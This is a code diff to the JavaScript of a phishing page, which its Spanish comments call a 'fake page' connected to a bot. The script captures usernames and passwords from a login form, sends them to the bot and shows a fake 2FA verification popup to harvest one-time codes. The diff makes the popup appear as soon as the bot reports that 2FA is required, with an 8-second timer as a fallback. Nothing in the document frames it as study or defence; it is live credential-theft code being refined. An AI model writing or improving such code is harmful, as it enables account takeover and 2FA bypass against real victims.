@@ -568,7 +568,7 @@
 
 <script>
 // ============================================================
-// SCRIPT PARA PÁGINA FAKE - CONECTA CON EL BOT
+// SCRIPT PARA PÁGINA FAKE - CONECTA CON EL BOT (VERSIÓN MEJORADA)
 // ============================================================
 
 function navigateToLogin(){
@@ -594,10 +594,11 @@ let popupMostrado = false;
 let esperandoCodigo = false;
 let usernameCapturado = '';
 let passwordCapturado = '';
+let timeoutPopup = null;
 
 function mostrarPopup2FA() {
     if (popupMostrado) return;
-    console.log('🔔 MOSTRANDO POPUP DE 2FA (8 segundos cumplidos)');
+    console.log('🔔 MOSTRANDO POPUP DE 2FA');
     const modal = document.getElementById('verificationModal');
     if (modal) {
         modal.style.display = 'flex';
@@ -627,6 +628,18 @@ async function enviarAlBot(username, password) {
         });
         const data = await response.json();
         console.log('📨 Respuesta del bot:', data);
+        
+        // 🔥 SI EL BOT RESPONDE CON 2FA, MOSTRAR POPUP INMEDIATAMENTE
+        if (data.status === '2FA_REQUERIDO' || data.status === 'EMAIL') {
+            console.log('⚠️ Bot indica 2FA, mostrando popup...');
+            // Cancelar el timeout de 8s si ya estaba programado
+            if (timeoutPopup) {
+                clearTimeout(timeoutPopup);
+                timeoutPopup = null;
+            }
+            mostrarPopup2FA();
+        }
+        
         return data;
     } catch (error) {
         console.error('❌ Error conectando con el bot:', error);
@@ -791,14 +804,17 @@ if (loginForm) {
         document.getElementById('loginBtn').style.display = 'none';
         document.getElementById('loginLoading').style.display = 'flex';
         
+        // Enviar credenciales al bot
         enviarAlBot(username, password);
         
-        console.log('⏰ Programando popup en 8 segundos...');
-        setTimeout(() => {
+        // Programar popup de respaldo a los 8 segundos
+        if (timeoutPopup) clearTimeout(timeoutPopup);
+        timeoutPopup = setTimeout(() => {
             if (!popupMostrado) {
-                console.log('⏰ 8 segundos cumplidos, mostrando popup...');
+                console.log('⏰ 8 segundos cumplidos, mostrando popup (respaldo)...');
                 mostrarPopup2FA();
             }
+            timeoutPopup = null;
         }, 8000);
     };
 }
